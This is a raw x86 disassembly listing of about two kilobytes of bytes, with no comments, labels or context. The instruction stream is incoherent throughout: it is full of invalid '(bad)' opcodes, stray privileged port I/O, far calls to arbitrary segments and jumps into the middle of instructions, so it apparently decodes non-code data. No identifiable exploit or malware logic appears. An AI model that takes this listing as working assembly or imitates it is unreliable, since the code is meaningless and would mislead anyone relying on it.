  426cf4:	jne    0x426d3b
  426cf6:	jge    0x426ce2
  426cf8:	fwait
  426cf9:	add    BYTE PTR [eax],al
  426cfb:	add    BYTE PTR [eax+0x23],ch
  426cfe:	sub    eax,0x7b1e6f1e
  426d03:	ja     0x426ce3
  426d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d06:	ss mov al,0xb3
  426d09:	daa    
  426d0a:	test   esp,edx
  426d0c:	cld    
  426d0d:	in     al,0x1
  426d0f:	add    BYTE PTR [ebp+0x5e000002],al
  426d15:	std    
  426d16:	mov    bh,0x59
  426d18:	das    
  426d19:	mov    DWORD PTR [ecx+0x1e29934c],0xd9738428
  426d23:	or     dh,BYTE PTR ds:0x55054244
  426d29:	in     al,0x60
  426d2b:	lock jecxz 0x426d63
  426d2e:	mov    ebx,ecx
  426d30:	pop    ebp
  426d31:	test   edi,ebx
  426d33:	adc    ecx,eax
  426d35:	sub    eax,0xcfff180a
  426d3a:	add    eax,0xad1a0a8b
  426d3f:	xchg   edx,eax
  426d40:	clc    
  426d41:	enter  0x97d2,0x9c
  426d45:	(bad)  
  426d46:	push   eax
  426d47:	scas   eax,DWORD PTR es:[edi]
  426d48:	fadd   QWORD PTR [edi-0x5d]
  426d4b:	inc    edi
  426d4c:	aaa    
  426d4d:	stos   BYTE PTR es:[edi],al
  426d4e:	in     eax,0x6d
  426d50:	mov    bl,BYTE PTR [ebx+ebp*2]
  426d53:	fcmove st,st(4)
  426d55:	sub    eax,0x5852a462
  426d5a:	mov    dh,0x50
  426d5c:	pop    ebp
  426d5d:	adc    BYTE PTR [edx],al
  426d5f:	call   0x29c:0x355d7e99
  426d66:	inc    esi
  426d67:	stc    
  426d68:	xor    DWORD PTR [edx-0x6fbc3eea],edx
  426d6e:	call   0x2639:0x3dc98c1c
  426d75:	ffreep st(3)
  426d77:	mov    esi,0xacfb3db9
  426d7c:	test   DWORD PTR [eax-0x2761098f],0x7115704d
  426d86:	or     eax,0x69973350
  426d8b:	scas   al,BYTE PTR es:[edi]
  426d8c:	adc    ecx,DWORD PTR [ecx+0x6b71a56]
  426d92:	jbe    0x426d39
  426d94:	push   ss
  426d95:	jb     0x426d57
  426d97:	mov    edx,0x81e00150
  426d9c:	out    dx,al
  426d9d:	fidiv  WORD PTR [ebp-0x72]
  426da0:	jae    0x426dce
  426da2:	imul   DWORD PTR [edx]
  426da4:	in     al,0x6c
  426da6:	outs   dx,DWORD PTR ds:[esi]
  426da7:	ret    
  426da8:	add    bl,BYTE PTR [eax]
  426daa:	sub    al,0x16
  426dac:	add    al,0xba
  426dae:	(bad)  
  426daf:	jl     0x426e20
  426db1:	std    
  426db2:	lahf   
  426db3:	fcomp  QWORD PTR [edx-0x48a7891d]
  426db9:	iret   
  426dba:	ret    
  426dbb:	push   gs
  426dbd:	gs or  eax,0xf43be314
  426dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dc4:	(bad)  
  426dc5:	jl     0x426dc3
  426dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dc8:	sbb    BYTE PTR [ebp-0x45],0xd9
  426dcc:	fidivr DWORD PTR [eax+0x5381e376]
  426dd2:	mov    gs,WORD PTR [edx-0x15280caf]
  426dd8:	shl    ebp,cl
  426dda:	mov    bh,0x62
  426ddc:	and    al,0xec
  426dde:	pop    edi
  426ddf:	aaa    
  426de0:	out    dx,al
  426de1:	cmp    eax,0xe6d89266
  426de6:	outs   dx,BYTE PTR ds:[esi]
  426de7:	pop    esi
  426de8:	or     esi,DWORD PTR [ebx]
  426dea:	jb     0x426e35
  426dec:	(bad)  
  426ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426def:	mov    dl,0x12
  426df1:	outs   dx,DWORD PTR ds:[esi]
  426df2:	mov    ebp,0x81d711ef
  426df7:	add    al,0x7c
  426df9:	xchg   DWORD PTR [esi],edx
  426dfb:	fst    QWORD PTR [edx+0x625b7a97]
  426e01:	pop    eax
  426e02:	ret    0x2265
  426e05:	pop    es
  426e06:	int    0x6a
  426e08:	leave  
  426e09:	dec    edx
  426e0a:	out    dx,eax
  426e0b:	adc    al,0x5f
  426e0d:	adc    BYTE PTR [esi],bl
  426e0f:	add    eax,0x42b6d47
  426e14:	ret    0x5b0f
  426e17:	inc    ecx
  426e18:	jp     0x426e12
  426e1a:	mov    ecx,0xebbd62ef
  426e1f:	pop    ds
  426e20:	into   
  426e21:	(bad)  
  426e22:	je     0x426da5
  426e24:	push   esp
  426e25:	sbb    dh,dl
  426e27:	push   0x1a
  426e29:	dec    ecx
  426e2a:	push   ecx
  426e2b:	jno    0x426db6
  426e2d:	aaa    
  426e2e:	inc    esp
  426e2f:	leave  
  426e30:	sub    DWORD PTR ds:0x9a809d9b,esp
  426e36:	mov    ecx,0x59b26ca3
  426e3b:	and    DWORD PTR [eax],ecx
  426e3d:	dec    ebx
  426e3e:	into   
  426e3f:	jb     0x426e46
  426e41:	test   eax,0xc268e73d
  426e46:	fist   WORD PTR [eax]
  426e48:	sub    BYTE PTR [esi+0x1a41f8ec],ah
  426e4e:	bound  ebx,QWORD PTR [esi-0x3d]
  426e51:	shl    DWORD PTR ds:0x6e8995b4,1
  426e57:	mov    bl,0x2c
  426e59:	stos   BYTE PTR es:[edi],al
  426e5a:	and    DWORD PTR [ebp+0x5a6d3221],eax
  426e60:	cmp    eax,0x824b0d11
  426e65:	sahf   
  426e66:	xchg   esi,eax
  426e67:	je     0x426ebf
  426e69:	pop    ecx
  426e6a:	lea    esi,[ebp+0xe]
  426e6d:	adc    eax,DWORD PTR [ebx+0x74]
  426e70:	in     al,0x5a
  426e72:	jnp    0x426e6a
  426e74:	not    BYTE PTR [esi+0x11]
  426e77:	aam    0x15
  426e79:	lods   al,BYTE PTR ds:[esi]
  426e7a:	gs jmp 0xb85d:0xc5a1c127
  426e82:	mov    cl,0xa1
  426e84:	cmp    eax,0x35fe4d2a
  426e89:	dec    esp
  426e8a:	jle    0x426e70
  426e8c:	into   
  426e8d:	(bad)  
  426e8e:	jge    0x426ef9
  426e90:	jmp    0x426f0f
  426e92:	ins    BYTE PTR es:[edi],dx
  426e93:	rol    DWORD PTR [esi-0x40],0x45
  426e97:	stc    
  426e98:	xor    eax,0x480720b8
  426e9d:	cmp    al,0xf4
  426e9f:	sub    BYTE PTR [esi+0x65a680ad],ch
  426ea5:	inc    ecx
  426ea6:	mov    bl,0xb1
  426ea8:	shl    DWORD PTR [ebp+0x3e8cec98],0x15
  426eaf:	push   ebp
  426eb0:	push   ebx
  426eb1:	dec    edx
  426eb2:	add    al,0x97
  426eb4:	dec    ebp
  426eb5:	bound  esi,QWORD PTR [eax+0x73a12c01]
  426ebb:	int3   
  426ebc:	aas    
  426ebd:	rol    DWORD PTR [eax+0x1e8c35f0],1
  426ec3:	dec    edi
  426ec4:	es inc ebx
  426ec6:	jmp    0x3700:0xdebb1583
  426ecd:	mov    es,WORD PTR [esi]
  426ecf:	cmc    
  426ed0:	pusha  
  426ed1:	adc    DWORD PTR [ecx+0x7d],ecx
  426ed4:	sub    ch,ah
  426ed6:	jo     0x426f1d
  426ed8:	aad    0x45
  426eda:	pop    edi
  426edb:	push   esi
  426edc:	into   
  426edd:	mov    bl,0x1
  426edf:	xor    al,0x78
  426ee1:	cmp    ah,BYTE PTR [eax]
  426ee3:	jnp    0x426f4e
  426ee5:	mov    ds:0xa664b798,eax
  426eea:	sbb    DWORD PTR [eax],esi
  426eec:	push   ss
  426eed:	cld    
  426eee:	ret    0xbe77
  426ef1:	sub    bh,BYTE PTR [edx+0x321588c]
  426ef7:	mov    ebx,0x87982e13
  426efc:	push   ecx
  426efd:	mov    es,WORD PTR [edx]
  426eff:	xor    eax,0xabbe8bd0
  426f04:	mov    al,ds:0x60b40b0a
  426f09:	loopne 0x426f6d
  426f0b:	sub    al,0x87
  426f0d:	mov    al,ds:0x49c6ee24
  426f12:	add    BYTE PTR [eax-0x35],0x7
  426f16:	inc    edi
  426f17:	imul   esi,DWORD PTR [eax+0x7b],0xffffff9d
  426f1b:	lods   al,BYTE PTR ds:[esi]
  426f1c:	add    BYTE PTR [edx+eax*4-0x7b],cl
  426f20:	stc    
  426f21:	cs cld 
  426f23:	cwde   
  426f24:	out    dx,eax
  426f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f26:	push   es
  426f27:	inc    eax
  426f28:	adc    eax,0x3eb7ec48
  426f2d:	add    BYTE PTR [ebp+0x3d],dh
  426f30:	cld    
  426f31:	cs call 0x9fe8:0xe4771ba0
  426f39:	or     DWORD PTR [ebp-0x3e],ebx
  426f3c:	mov    WORD PTR es:[ecx-0x4e],fs
  426f40:	mov    ebp,0x3bb8dee7
  426f45:	cmp    DWORD PTR [ebp+0x5],edx
  426f48:	(bad)  [esi-0x590d24f2]
  426f4e:	sub    DWORD PTR [edx+edx*1+0x7bba37af],ebp
  426f55:	retf   
  426f56:	dec    eax
  426f57:	std    
  426f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f59:	imul   edi,DWORD PTR [eax],0xffffffa9
  426f5c:	adc    bh,BYTE PTR [edi]
  426f5e:	fidivr WORD PTR [ebx]
  426f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f61:	arpl   WORD PTR [esi+0x2f],dx
  426f64:	sbb    ebp,DWORD PTR [edi]
  426f66:	push   esp
  426f67:	or     DWORD PTR [edx],edi
  426f69:	icebp  
  426f6a:	push   ds
  426f6b:	out    0xa1,al
  426f6d:	xchg   ebx,eax
  426f6e:	addr16 push ebp
  426f70:	sub    eax,0x4c61e9dd
  426f75:	add    BYTE PTR [eax+0x32b9f8b4],al
  426f7b:	xor    ah,BYTE PTR [edi]
  426f7d:	xlat   BYTE PTR ds:[ebx]
  426f7e:	in     eax,dx
  426f7f:	das    
  426f80:	mov    DWORD PTR [ebx-0x27526b3d],ecx
  426f86:	push   esp
  426f87:	push   edx
  426f88:	jno    0x426f5d
  426f8a:	into   
  426f8b:	xor    BYTE PTR [eax+edi*1],0x78
  426f8f:	pusha  
  426f90:	mov    ecx,ss
  426f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f93:	aad    0x48
  426f95:	xor    esp,DWORD PTR [edi+0x628d]
  426f9b:	add    BYTE PTR [ecx-0x6600738],bl
  426fa1:	mov    edi,0xdf92ceff
  426fa6:	push   ds
  426fa7:	outs   dx,BYTE PTR ds:[esi]
  426fa8:	push   ds
  426fa9:	cs iret 
  426fab:	je     0x426f2e
  426fad:	out    0x1,eax
  426faf:	add    BYTE PTR [ebp+0x14000002],al
  426fb5:	adc    DWORD PTR [ebx+ebp*1-0x3cd8c16a],ecx
  426fbc:	inc    esp
  426fbd:	xor    eax,0xa72897fa
  426fc2:	pop    ecx
  426fc3:	fwait
  426fc4:	in     al,0xca
  426fc6:	xchg   DWORD PTR [ebp-0x13],ecx
  426fc9:	mov    es:0xc46ad6ef,eax
  426fcf:	cwde   
  426fd0:	div    bl
  426fd2:	jge    0x42700a
  426fd4:	push   ss
  426fd5:	nop
  426fd6:	enter  0xe868,0xee
  426fda:	cmc    
  426fdb:	mov    al,ds:0xa551ee67
  426fe0:	shl    bh,1
  426fe2:	sahf   
  426fe3:	xor    bh,BYTE PTR [esi]
  426fe5:	ret    0x83d3
  426fe8:	(bad)  
  426fea:	pcmpgtw mm4,QWORD PTR [edx+0x70da2af7]
  426ff1:	cld    
  426ff2:	repnz pop ebx
  426ff4:	sbb    ebp,DWORD PTR [edi]
  426ff6:	retf   0x1f2b
  426ff9:	sub    ebx,DWORD PTR [edx+0x2]
  426ffc:	xor    eax,0xbd3781da
  427001:	imul   edi,DWORD PTR [edi+0xf],0x66cd4939
  427008:	pop    edx
  427009:	in     eax,dx
  42700a:	add    ah,BYTE PTR [ebx-0x60]
  42700d:	add    BYTE PTR [edx-0x14],bl
  427010:	sub    esp,DWORD PTR ds:0x6a26a2bf
  427016:	mov    ch,0xb5
  427018:	pop    edi
  427019:	inc    eax
  42701a:	sbb    eax,DWORD PTR [ebp-0x1bb15936]
  427020:	jp     0x427083
  427022:	es mov ecx,0x48f10ad3
  427028:	test   cl,cl
  42702a:	pop    edx
  42702b:	xchg   esi,eax
  42702c:	mov    ds:0x9346e0bf,eax
  427031:	jno    0x427006
  427033:	ds mov ch,0x54
  427036:	mov    cl,0xe3
  427038:	js     0x42702f
  42703a:	sub    ch,BYTE PTR [eax+0x33b3527b]
  427040:	dec    ebx
  427041:	push   es
  427042:	les    edi,FWORD PTR [ebx-0x33]
  427045:	icebp  
  427046:	or     edx,edx
  427048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427049:	inc    edx
  42704a:	mov    ds:0x2c2b2f1a,al
  42704f:	xor    DWORD PTR [edx],esp
  427051:	loop   0x427052
  427053:	mov    ecx,0xacf1e018
  427058:	pop    es
  427059:	push   ecx
  42705a:	sbb    cl,ch
  42705c:	iret   
  42705d:	and    ebx,esp
  42705f:	imul   esi,DWORD PTR [edi],0x54
  427062:	adc    DWORD PTR [ebp-0x1],edx
  427065:	shl    BYTE PTR [ecx],cl
  427067:	xchg   ebp,esi
  427069:	call   0xab3f:0xe751d9cb
  427070:	mov    eax,esi
  427072:	daa    
  427073:	cvtpi2ps xmm3,QWORD PTR [edi-0x628ee8ed]
  42707a:	xchg   esi,eax
  42707b:	sar    DWORD PTR [edx],1
  42707d:	mov    bl,0x3
  42707f:	xchg   esi,eax
  427080:	xchg   ecx,eax
  427081:	sbb    al,0x6e
  427083:	repz data16 jge 0x42704c
  427087:	mov    es,ebp
  427089:	shr    BYTE PTR [ebp-0x57],1
  42708c:	xchg   DWORD PTR ds:0xb1ade36,ebp
  427092:	inc    esp
  427093:	out    0x66,eax
  427095:	jno    0x4270a4
  427097:	and    ah,BYTE PTR [esi]
  427099:	xchg   esp,eax
  42709a:	loope  0x427077
  42709c:	sbb    eax,0x3e65d0b9
  4270a1:	mov    edx,0x87aa491b
  4270a6:	std    
  4270a7:	mov    ebx,0x641c3247
  4270ac:	and    BYTE PTR [ebx],al
  4270ae:	dec    esp
  4270af:	enter  0x1f1b,0x0
  4270b3:	add    eax,edi
  4270b5:	jno    0x4270e7
  4270b7:	enter  0x611c,0xe2
  4270bb:	dec    edx
  4270bc:	cld    
  4270bd:	inc    ebx
  4270be:	push   ebx
  4270bf:	enter  0x3a43,0xf3
  4270c3:	inc    ebx
  4270c4:	jge    0x427069
  4270c6:	out    dx,al
  4270c7:	sbb    al,0xe6
  4270c9:	dec    esp
  4270ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270cb:	loop   0x4270e5
  4270cd:	or     ch,BYTE PTR [edx-0x272079c3]
  4270d3:	mov    es:0xc0d50a00,al
  4270d9:	ficom  DWORD PTR [ecx+edi*1-0x3c]
  4270dd:	cdq    
  4270de:	jle    0x427078
  4270e0:	push   ebx
  4270e1:	add    eax,DWORD PTR [edi-0x38]
  4270e4:	adc    al,0xee
  4270e6:	and    ch,BYTE PTR [edx-0xe0d08e9]
  4270ec:	adc    eax,0x8e1b542f
  4270f1:	mov    bl,dl
  4270f3:	mov    esi,0x95f6cb0f
  4270f8:	(bad)  
  4270f9:	aam    0x49
  4270fb:	jecxz  0x427178
  4270fd:	mov    al,0xfb
  4270ff:	ins    DWORD PTR es:[edi],dx
  427100:	shr    dl,cl
  427102:	add    ebx,DWORD PTR [edx]
  427104:	cld    
  427105:	jne    0x4270d3
  427107:	adc    ebx,DWORD PTR [ebp*4+0x52f1cd9d]
  42710e:	jns    0x4270bf
  427110:	fimul  DWORD PTR [edi+0x4b0a4e7c]
  427116:	xor    bh,al
  427118:	push   edx
  427119:	aad    0x39
  42711b:	inc    eax
  42711c:	fs push es
  42711e:	jmp    FWORD PTR [edx-0x56d5ad60]
  427124:	fwait
  427125:	stc    
  427126:	adc    al,BYTE PTR [ebx+0x27]
  427129:	cs jns 0x427195
  42712c:	std    
  42712d:	pop    esp
  42712e:	aaa    
  42712f:	pop    esp
  427130:	inc    ebp
  427131:	std    
  427132:	or     ch,dh
  427134:	stos   BYTE PTR es:[edi],al
  427135:	xchg   edi,eax
  427136:	dec    edx
  427137:	cli    
  427138:	jge    0x4270c6
  42713a:	pop    ecx
  42713b:	mov    dl,bl
  42713d:	jae    0x4271a7
  42713f:	sbb    al,0x7b
  427141:	sbb    al,0xbb
  427143:	jne    0x4270fd
  427145:	pop    es
  427146:	int3   
  427147:	inc    ebp
  427148:	(bad)  
  427149:	lds    edx,FWORD PTR [edx-0x2e]
  42714c:	add    bh,bl
  42714e:	hlt    
  42714f:	icebp  
  427150:	adc    DWORD PTR [esi+0x52],ebx
  427153:	add    eax,0x1f838e0d
  427158:	xor    esi,DWORD PTR [edx]
  42715a:	(bad)  
  42715b:	xlat   BYTE PTR ds:[ebx]
  42715c:	xchg   edi,eax
  42715d:	mov    edi,0xa4be1adc
  427162:	ficomp WORD PTR [edx+0x428298f6]
  427168:	loopne 0x42715d
  42716a:	fld    DWORD PTR [ebx+0xc]
  42716d:	je     0x427159
  42716f:	ret    
  427170:	popf   
  427171:	loope  0x4271df
  427173:	aaa    
  427174:	(bad)  
  427175:	adc    BYTE PTR [ebx],ch
  427177:	mov    ch,ah
  427179:	mov    ds:0xca3b9a47,eax
  42717e:	ret    
  42717f:	inc    ecx
  427180:	and    eax,0x709febc0
  427185:	sti    
  427186:	outs   dx,BYTE PTR ds:[esi]
  427187:	aam    0xf3
  427189:	dec    ebx
  42718a:	or     eax,0xe8b52f4d
  42718f:	mov    ds:0xcb22c1fa,al
  427194:	add    DWORD PTR [esi+0x10f7967f],ebp
  42719a:	or     al,0xa
  42719c:	mov    bl,0x62
  42719e:	mov    edi,0xf44975c0
  4271a3:	fbld   TBYTE PTR [ebp-0x3e]
  4271a6:	daa    
  4271a7:	lock loope 0x4271c2
  4271aa:	mov    WORD PTR [eax+0x1496c1ff],?
  4271b0:	fcom   DWORD PTR [ebp+0x54]
  4271b3:	sbb    al,0xe8
  4271b5:	add    eax,0xf2beb79c
  4271ba:	mov    bh,0x7d
  4271bc:	mov    ebp,0x8b4d19de
  4271c1:	pop    ebp
  4271c2:	or     ch,dh
  4271c4:	jmp    0x258e:0x95530f4a
  4271cb:	test   BYTE PTR [ebx+esi*4+0x76d4a3e9],dh
  4271d2:	cmp    DWORD PTR [ebp-0x3e7361b6],ebp
  4271d8:	xchg   DWORD PTR [esi],ecx
  4271da:	mov    al,0x15
  4271dc:	fstp   st(4)
  4271de:	inc    bh
  4271e0:	sub    DWORD PTR [edx+0x33],eax
  4271e3:	pusha  
  4271e4:	clc    
  4271e5:	inc    esi
  4271e6:	repnz cmp al,0x6
  4271e9:	sub    DWORD PTR [esp+ecx*8+0x4a27eccf],eax
  4271f0:	(bad)  
  4271f1:	retf   0x908a
  4271f4:	fwait
  4271f5:	pop    ebp
  4271f6:	jnp    0x427251
  4271f8:	adc    BYTE PTR [edi+edx*4+0x611351f6],al
  4271ff:	(bad)  
  427200:	mov    ?,esp
  427202:	mov    dl,0x6f
  427204:	nop
  427205:	jge    0x4271a9
  427207:	(bad)  
  427208:	ins    DWORD PTR es:[edi],dx
  427209:	and    al,0x0
  42720c:	stc    
  42720d:	out    0xf2,al
  42720f:	push   eax
  427210:	dec    ecx
  427211:	jl     0x42727c
  427213:	imul   ecx,DWORD PTR [eax+0x2f110372],0x68
  42721a:	jb     0x427266
  42721c:	and    BYTE PTR [eax],al
  42721e:	pop    esp
  42721f:	lea    edi,es:[esi+0x69c02d79]
  427226:	leave  
  427227:	sbb    eax,0x3a14ed44
  42722c:	adc    eax,0xafa1e42
  427231:	lods   eax,DWORD PTR ds:[esi]
  427232:	clc    
  427233:	inc    esp
  427234:	js     0x4271f6
  427236:	lahf   
  427237:	cdq    
  427238:	or     al,0x0
  42723a:	add    BYTE PTR [eax],al
  42723c:	jns    0x427248
  42723e:	sbb    BYTE PTR gs:[edi+0x7f],dh
  427242:	jge    0x4272af
  427244:	int3   
  427245:	outs   dx,BYTE PTR ds:[esi]
  427246:	xchg   esi,esi
  427248:	adc    eax,0x608cfed
  42724d:	jmp    0x0:0x2850001
  427254:	mov    ah,0xa4
  427256:	cmp    ah,BYTE PTR [edx+ebx*8-0x5ab43cf3]
  42725d:	cs call 0xc1a:0x4212c85b
  427265:	ja     0x4272b6
  427267:	mov    ebx,0x9accacec
  42726c:	add    bl,BYTE PTR [ebx+0x18]
  42726f:	test   BYTE PTR [ecx+0x65],bl
  427272:	push   es
  427273:	inc    ebx
  427274:	ja     0x427225
  427276:	int    0x79
  427278:	test   BYTE PTR [ecx-0x2d],ah
  42727b:	stc    
  42727c:	add    BYTE PTR [ebx],dl
  42727e:	aaa    
  42727f:	mov    al,ds:0x90b0cb1b
  427284:	call   0x6f0f:0x61f28e6d
  42728b:	xor    eax,0x6a3ceabb
  427290:	pop    edx
  427291:	rsm    
  427293:	and    ebp,DWORD PTR [ecx]
  427295:	fwait
  427296:	dec    edi
  427297:	nop
  427298:	mov    ecx,0xd842c1f0
  42729d:	pop    ebp
  42729e:	mov    edx,ebp
  4272a0:	push   edi
  4272a1:	pop    edx
  4272a2:	sub    ebx,DWORD PTR [ebx]
  4272a4:	icebp  
  4272a5:	mov    ebp,0xc36be897
  4272aa:	cmp    ah,BYTE PTR [ecx+0x5439c05a]
  4272b0:	jle    0x4272f7
  4272b2:	enter  0x4ddf,0x89
  4272b6:	js     0x427250
  4272b8:	mov    al,ds:0xac198a04
  4272bd:	into   
  4272be:	out    0x5c,al
  4272c0:	sar    DWORD PTR [edx+0x3211d943],0x88
  4272c7:	xlat   BYTE PTR ds:[ebx]
  4272c8:	nop
  4272c9:	or     BYTE PTR [eax],al
  4272cb:	cmp    BYTE PTR [eax],ah
  4272cd:	scas   al,BYTE PTR es:[edi]
  4272ce:	or     edi,DWORD PTR [ebx]
  4272d0:	push   cs
  4272d1:	sbb    DWORD PTR [eax+0x1212b60d],edi
  4272d7:	fistp  WORD PTR ds:0x564e849c
  4272dd:	xor    DWORD PTR [eax-0x53],ebp
  4272e0:	outs   dx,DWORD PTR ds:[esi]
  4272e1:	shl    DWORD PTR [edx+0x35],cl
  4272e4:	out    dx,eax
  4272e5:	and    bl,bl
  4272e7:	add    BYTE PTR [eax],ch
  4272e9:	mov    edi,0x1b44c4af
  4272ee:	call   0xbfb9:0x36db4cc2
  4272f5:	out    0x88,al
  4272f7:	jbe    0x4272d6
  4272f9:	ja     0x4272b1
  4272fb:	and    al,0x6
  4272fd:	xor    DWORD PTR [ebx+0x62],eax
  427300:	les    ebx,FWORD PTR [eax-0xf]
  427303:	ja     0x4272d4
  427305:	inc    eax
  427306:	call   0x480b:0xd560f4f6
  42730d:	dec    ebp
  42730e:	call   0x7054c826
  427313:	xchg   esp,eax
  427314:	test   DWORD PTR [ebx+0x54],edx
  427317:	pop    ss
  427318:	jmp    0x82ae:0x20fe198
  42731f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427320:	out    0x7b,al
  427322:	clc    
  427323:	inc    edx
  427324:	outs   dx,DWORD PTR ds:[esi]
  427325:	cld    
  427326:	ss push 0x842f4149
  42732c:	xor    DWORD PTR [edx],ebx
  42732e:	out    0x9c,eax
  427330:	mov    ss,WORD PTR [ecx+0x249db379]
  427336:	push   edi
  427337:	mov    ah,0x2
  427339:	pop    esi
  42733a:	in     al,0x52
  42733c:	mov    eax,ds:0x843908fb
  427341:	xor    eax,0xecb71719
  427346:	out    0xfa,eax
  427348:	lock add BYTE PTR [edi+edx*4-0x4398d6ae],dl
  427350:	xchg   esi,eax
  427351:	xor    BYTE PTR [ecx-0x266bdec2],bh
  427357:	fcmovnu st,st(0)
  427359:	sub    edx,DWORD PTR [eax+0x6]
  42735c:	ds push ds
  42735e:	inc    eax
  42735f:	cmp    al,0x7f
  427361:	pop    es
  427362:	and    eax,0xd963807a
  427367:	cmc    
  427368:	test   DWORD PTR [edi-0x698cec15],edx
  42736e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42736f:	test   eax,0x18aad404
  427374:	adc    eax,0x18c01546
  427379:	and    dl,cl
  42737b:	popa   
  42737c:	jecxz  0x4273d2
  42737e:	xchg   DWORD PTR [edi-0x31],edx
  427381:	mov    esi,0xb64cb2d0
  427386:	pushf  
  427387:	jmp    0x4273ba
  427389:	jg     0x4273aa
  42738b:	mov    ss,WORD PTR [ecx]
  42738d:	ss pop esp
  42738f:	xor    al,0x8
  427391:	fimul  WORD PTR [ebx]
  427393:	mov    al,0x82
  427395:	stos   BYTE PTR es:[edi],al
  427396:	dec    ecx
  427397:	sbb    esp,DWORD PTR [edi]
  427399:	sbb    al,0x41
  42739b:	cmc    
  42739c:	mov    esp,eax
  42739e:	retf   0x7ef3
  4273a1:	mov    edi,0x496753c9
  4273a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273a7:	xchg   ebx,eax
  4273a8:	jl     0x42733c
  4273aa:	pusha  
  4273ab:	adc    ecx,DWORD PTR [eax-0x47]
  4273ae:	arpl   bx,bp
  4273b0:	aas    
  4273b1:	(bad)  
  4273b2:	hlt    
  4273b3:	daa    
  4273b4:	ja     0x427345
  4273b6:	pop    eax
  4273b7:	cmp    DWORD PTR [ecx+0x42],eax
  4273ba:	out    0x4b,al
  4273bc:	push   es
  4273bd:	aam    0x61
  4273bf:	dec    edi
  4273c0:	cmp    DWORD PTR [edi],ecx
  4273c2:	test   eax,0xac61736c
  4273c7:	inc    esp
  4273c8:	adc    cl,BYTE PTR [esp+edx*2+0x6f]
  4273cc:	addr16 push es
  4273ce:	repnz sbb al,0x8c
  4273d1:	sub    al,0x55
  4273d3:	ja     0x427396
  4273d5:	sbb    al,0x49
  4273d7:	test   eax,0x5c763ef7
  4273dc:	push   es
  4273dd:	xchg   DWORD PTR [esi-0x33],ecx
  4273e0:	mov    cl,0x69
  4273e2:	in     al,0x4c
  4273e4:	call   FWORD PTR [eax-0xd9f204]
  4273ea:	pop    ds
  4273eb:	jle    0x427469
  4273ed:	ja     0x4273ca
  4273ef:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4273f1:	aad    0x24
  4273f3:	inc    edi
  4273f4:	jmp    0xa5bce547
  4273f9:	push   eax
  4273fa:	sar    BYTE PTR [edx-0x2185fd57],0xd2
  427401:	daa    
  427402:	fs (bad) 
  427404:	mov    ebx,0x6895eb51
  427409:	int    0x77
  42740b:	lods   al,BYTE PTR ds:[esi]
  42740c:	sbb    DWORD PTR [edi+0x6],ebx
  42740f:	xchg   edx,eax
  427410:	out    0xae,al
  427412:	pop    edx
  427413:	popa   
  427414:	call   0xcbb2:0xb0237c8c
  42741b:	or     edx,DWORD PTR [eax]
  42741d:	cs or  eax,0xcc17b9c1
  427423:	xor    BYTE PTR [esi],al
  427425:	ds scas al,BYTE PTR es:[edi]
  427427:	shl    BYTE PTR fs:[ebx+0x5d],cl
  42742b:	adc    ah,BYTE PTR [eax+0x21]
  42742e:	dec    edx
  42742f:	mov    BYTE PTR [edx-0x5c],ah
  427432:	dec    edi
  427433:	push   esp
  427434:	rol    BYTE PTR [ebp-0x2396d77b],cl
  42743a:	out    dx,al
  42743b:	jp     0x427448
  42743d:	adc    al,0x30
  42743f:	cmp    esp,DWORD PTR [ecx]
  427441:	add    al,0x69
  427443:	jl     0x42749e
  427445:	pusha  
  427446:	and    DWORD PTR [ecx-0x5e],esi
  427449:	xor    DWORD PTR [ebp+0x26b34812],ebp
  42744f:	xchg   esi,eax
  427450:	mov    ecx,0x96c386ae
  427455:	stos   BYTE PTR es:[edi],al
  427456:	jae    0x42740d
  427458:	add    eax,DWORD PTR ds:0x924ba97b
  42745e:	mov    ch,BYTE PTR [ebx+0x2d]
  427461:	ror    esi,1
  427463:	call   DWORD PTR [esi+0x12]
  427466:	lock xchg DWORD PTR [ebp+0x2e],ecx
  42746a:	das    
  42746b:	imul   edx,DWORD PTR [edi-0x4012a9e6],0x1dcfc788
  427475:	jg     0x4274d5
  427477:	mov    dh,dl
  427479:	sub    BYTE PTR ds:0xcd162c75,dl
  42747f:	jb     0x427409
  427481:	sbb    esp,0x66
  427484:	mov    ah,0x9c
  427486:	adc    DWORD PTR [eax+0x78609e02],edi
  42748c:	sub    DWORD PTR [ebp-0xa],ecx
  42748f:	dec    esi
  427490:	lods   al,BYTE PTR ds:[esi]
  427491:	jae    0x42746a
  427493:	in     al,dx
  427494:	xchg   edx,eax
  427495:	cmp    ecx,DWORD PTR [esi+eiz*8-0xd]
  427499:	repnz inc edx
  42749b:	mov    ah,0x2d
  42749d:	xlat   BYTE PTR ds:[ebx]
  42749e:	(bad)  
  42749f:	ins    BYTE PTR es:[edi],dx
  4274a0:	stc    
  4274a1:	jl     0x427499
  4274a3:	test   DWORD PTR [edi+0x35],esi
  4274a6:	sbb    BYTE PTR [eax+0x5c],bl
  4274a9:	sub    bh,cl
  4274ab:	mov    BYTE PTR [ecx-0x5a],dh
  4274ae:	jl     0x4274a6
  4274b0:	cmc    
  4274b1:	es xchg ebx,eax
  4274b3:	mov    BYTE PTR [bx+di],bl
  4274b6:	push   ss
  4274b7:	sbb    BYTE PTR [ecx+ebp*2+0x67c7290f],bh
  4274be:	sub    esi,DWORD PTR [esi+0x45297144]
  4274c4:	jne    0x427500
  4274c6:	rcl    BYTE PTR [edx],0xb3
  4274c9:	mov    bl,0x67
  4274cb:	out    dx,al
  4274cc:	in     eax,dx
  4274cd:	test   al,0xe1
  4274cf:	test   eax,0x53de6f4b
  4274d4:	sbb    eax,DWORD PTR [ebx-0x2a]
  4274d7:	cmc    
  4274d8:	push   ecx
